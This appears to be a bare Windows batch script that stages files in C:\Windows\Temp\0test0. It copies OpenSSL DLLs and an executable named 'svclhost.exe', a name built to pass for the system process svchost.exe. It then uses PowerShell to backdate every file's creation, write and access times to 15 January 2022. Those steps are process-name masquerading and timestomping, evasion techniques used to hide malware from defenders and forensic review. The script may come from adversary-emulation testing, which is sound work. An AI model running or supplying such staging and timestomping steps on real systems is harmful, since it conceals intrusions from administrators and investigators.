cd "C:\Windows\Temp"
mkdir 0test0
copy /y "C:\Windows\Temp\libssl-3.dll" "C:\Windows\Temp\0test0\libssl-3.dll"
copy /y "C:\Windows\Temp\libcrypto-3.dll" "C:\Windows\Temp\0test0\libcrypto-3.dll"
copy /y "C:\Windows\Temp\svclhost.exe" "C:\Windows\Temp\0test0\svclhost.exe"
cd "C:\Windows\Temp\0test0"

powershell -Command "Get-ChildItem -force C:\Windows\Temp\0test0 * | ForEach-Object{$_.CreationTime = ('15 January 2022 10:00:00')}"
powershell -Command "Get-ChildItem -force C:\Windows\Temp\0test0 * | ForEach-Object{$_.LastWriteTime = ('15 January 2022 10:00:00')}"
powershell -Command "Get-ChildItem -force C:\Windows\Temp\0test0 * | ForEach-Object{$_.LastAccessTime = ('15 January 2022 10:00:00')}"
